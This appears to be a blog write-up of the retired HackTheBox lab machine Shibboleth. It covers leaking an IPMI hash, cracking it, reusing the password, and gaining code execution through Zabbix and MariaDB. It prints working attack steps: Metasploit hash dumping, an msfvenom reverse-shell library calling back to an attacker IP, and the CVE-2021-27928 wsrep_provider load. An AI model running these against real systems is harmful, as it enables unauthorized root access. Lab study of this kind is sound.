---
layout: post
title: "The Word That Opened Every Door"
subtitle: "HTB Shibboleth, where a forgotten management chip bleeds a password hash before you log in, and the same word walks you all the way to a database that runs as root"
date: 2022-04-09 12:00:00 +0000
description: "A management chip hands out an admin hash before you authenticate, and one cracked word unlocks Zabbix, a second user, and finally a database daemon running as root."
image: /assets/og/the-word-that-opened-every-door.png
tags: [hackthebox, writeup]
---

A shibboleth is a word you say to prove you belong. Get it right and the gate opens. Get it wrong and the guard knows you are a stranger. This box is named for exactly that, because the whole climb is one password said over and over until every door agrees you are family. It starts with a chip almost nobody remembers is listening, a baseboard management controller that will hand you an administrator's password hash before you have logged into anything at all. You crack the hash into a single word. Then you watch that word open a monitoring console, become a second user by simple reuse, and finally turn a database server into a root shell. No memory corruption, no clever overflow. Just a secret that was supposed to be said once and got said everywhere.

```
        S H I B B O L E T H
        ===================
        udp/623   "who goes there?"
                  the chip answers with a HASH
                  before you even knock.
                       |
                       v
        crack it ->  one word: ilovepumkinpie1
                       |
        zabbix login.  ipmi-svc login.  mysql login.
        the same word fits all three locks.
                       |
                       v
        say the word at the database.
        the database is root, and it believes you.
                                            言
```

## 0x01 · the quiet chip

`nmap` is almost insultingly short. Port 80 serves Apache and bounces you to `shibboleth.htb`, and that is the only TCP port worth a second glance. The interesting answer is hiding on UDP, so a `nmap -sU` sweep is mandatory rather than optional.

```
PORT     STATE SERVICE
80/tcp   open  http      Apache httpd 2.4.41
623/udp  open  asf-rmcp
```

A little vhost fuzzing against the web port turns up three names that all point at the same login page.

```
$ wfuzz -u http://shibboleth.htb -H "Host: FUZZ.shibboleth.htb" --hw 26
000000123:  monitor.shibboleth.htb
000000456:  monitoring.shibboleth.htb
000000789:  zabbix.shibboleth.htb
```

But the prize is UDP 623. That port is IPMI, the Intelligent Platform Management Interface, the protocol a baseboard management controller speaks. Think of a BMC as the building superintendent who has a master key and a private phone line into every apartment, completely separate from the front door everyone else uses. It exists so an admin can reboot or reinstall a dead server from across the world. It is powerful by design, and that is the problem.

## 0x02 · the hash that leaks before the lock

IPMI version 2.0 carries a flaw so structural it has a name and a CVE, CVE-2013-4786. The handshake, called RAKP, was designed to let a client prove it knows a password without sending the password. Fine in theory. The catastrophe is that the server sends back a value derived from the stored password hash *before* it ever checks whether the client is legitimate. So a complete stranger can ask politely and walk away with a crackable hash for any user that exists.

Picture a bank vault that, the instant you say a name at the intercom, reads back a scrambled copy of that person's PIN to help you "verify" it. You were never let inside. The vault just handed you the homework you need to forge your way in later, to anyone who asks.

The Metasploit module built for exactly this does the asking.

```
msf6 > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 > set RHOSTS 10.10.10.124
msf6 > run

[+] 10.10.10.124:623 - Administrator hash found:
    Administrator:bfa382dc8405...a123456789abcdef140d41646d696e6973747261746f72:f4b2...
```

That is the Administrator account's RAKP hash, leaked from a chip, no login required. Feed it to `hashcat` in IPMI mode and a real word falls out.

```
$ hashcat -m 7300 ipmi.hash rockyou.txt
...a123456789abcdef140d...:ilovepumkinpie1
```

`ilovepumkinpie1`. Hold that word. It is the shibboleth, and the rest of the box is just doors recognizing it.

## 0x03 · the console that runs errands

Those three vhosts all serve Zabbix, a network monitoring platform running version 5.0. The leaked Administrator and the cracked word log straight in. A monitoring tool's entire job is to reach out to machines and run checks on them, which means a monitoring tool is, by design, a remote command runner wearing a respectable suit. You just have to ask it to run your check instead of a real one.

Zabbix has an agent key called `system.run`, and it does precisely what the name says. From the web UI you create a new item on the monitored host, set its key to `system.run`, and the server obediently executes your string on the box. There is one wrinkle. A normal `system.run` waits for the command to finish, and a reverse shell never finishes, so the request hangs and dies. The fix is the documented `nowait` flag, which tells Zabbix to fire the command and stop caring about the result.

```
key:  system.run[echo [base64 of: bash reverse shell to 10.10.14.4:443] | base64 -d | bash, nowait]
```

I am describing the reverse shell rather than printing it on purpose. The payload here is just `[ a bash reverse shell over /dev/tcp back to 10.10.14.4 on 443 ]`, base64-wrapped so the special characters survive the trip through the form field. Start a listener, hit Test on the item, and the shell lands.

```
$ nc -lvnp 443
connect to [10.10.14.4] from 10.10.10.124
$ id
uid=110(zabbix) gid=120(zabbix) groups=120(zabbix)
```

You are `zabbix`, the service account. Not root, not even a real person, but a foothold with a real shell.

## 0x04 · the same word, the second door

From `zabbix` the move is almost embarrassing. There is a local user named `ipmi-svc`, and people who set up a BMC tend to reuse the BMC password for the service account that talks to it. The shibboleth still works.

```
zabbix@shibboleth:/$ su - ipmi-svc
Password: ilovepumkinpie1
ipmi-svc@shibboleth:~$ cat user.txt
████████████████████████████████
```

One word, said a third time, and the door opens again. This is the whole thesis of the box made literal. A password is not a key cut to a single lock. It is a word, and a word can be repeated anywhere the speaker chooses, including in every place they should not have.

## 0x05 · the database that is also root

`ipmi-svc` is not an admin, so look where Zabbix keeps its own secrets. The server config spells out the database login in plain text, because it has to connect on every startup.

```
ipmi-svc@shibboleth:~$ grep -i pass /etc/zabbix/zabbix_server.conf
DBPassword=bloooarskybluh
```

That logs into MariaDB as the `zabbix` database user. Check the version and the last door swings into view.

```
MariaDB> SELECT VERSION();
10.3.25-MariaDB-0ubuntu0.20.04.1
```

MariaDB 10.3.25 is vulnerable to CVE-2021-27928, and the bug is a beautiful piece of misplaced trust. The database has a setting called `wsrep_provider`, meant to point at a clustering library so multiple database servers can sync with each other. The flaw is that an authenticated user can set that path to *any* shared object on disk, and the database will load it on the spot, executing whatever code sits in the library's constructor.

Think of it like a kitchen that lets any cook hand the head chef a recipe card, and the chef will run out and buy whatever brand of oil the card names, no questions asked. Name a normal brand and nothing happens. Name a bottle you rigged, and the chef pours your poison into the company's largest pot. The database daemon on this box runs as root, so the pot is root's.

Build the malicious library with `msfvenom`, sign it as your own, and drop it where the database can reach it.

```
$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=4444 \
    -f elf-so -o iceberg.so
$ # transfer iceberg.so to /dev/shm on the target
```

Then say the word one final time. Point the cluster provider at your library and the daemon loads it as root.

```
MariaDB> SET GLOBAL wsrep_provider='/dev/shm/iceberg.so';
```

```
$ nc -lvnp 4444
connect to [10.10.14.4] from 10.10.10.124
# id
uid=0(root) gid=0(root) groups=0(root)
# cat /root/root.txt
████████████████████████████████
```

The database believed your recipe card and handed over its crown.

## 0x06 · the honest caveat

It is easy to read Shibboleth as four separate bugs and miss that it is really one bug told four times. The IPMI hash leak is a protocol flaw, the Zabbix run is a feature, the `su` is reuse, and the MariaDB load is a misconfiguration. Different categories, same disease. A single secret was treated as a universal proof of identity, and identity is exactly the thing a secret cannot prove once it has leaked.

The leak is the part worth sitting with. That BMC handed out a hash to an unauthenticated stranger, which means the password was compromised the moment the chip was reachable, long before anyone typed it. Everything after was just spending it. Picture a house where the spare key is hidden under a mat that announces, to anyone who walks by, a scrambled photo of the key's shape. You can change every lock in the house, but if they all take the same key, and the mat keeps describing it, you have not fixed anything. You have just given the burglar more doors to try the one key on.

So the lesson is older than any of these CVEs. Reachability decides everything, and a secret reused is a secret multiplied. The fix is not a patch on Tuesday. It is the discipline to say each word in exactly one place, to keep the superintendent's phone line off the public street, and to assume that any value a service will hand you before you authenticate is already in the attacker's pocket.

## 0x07 · outro

```
the chip answered a stranger with a password it should have guarded.
one word fit the console, the user, and the database in turn.
nothing was overpowered. everything was simply recognized.

a secret said in four places is not a secret. it is a habit.
the gate does not check who you are. it only checks the word.

leak nothing before the login. say each word once. wear black.

                                                            EOF
```

---

*HTB: Shibboleth, retired 02 Apr 2022. A medium Linux box that is really a lecture on one reused word, a leaking management chip, and a database that loads whatever library you name. The BMC still overshares in a lab and nowhere you do not own.*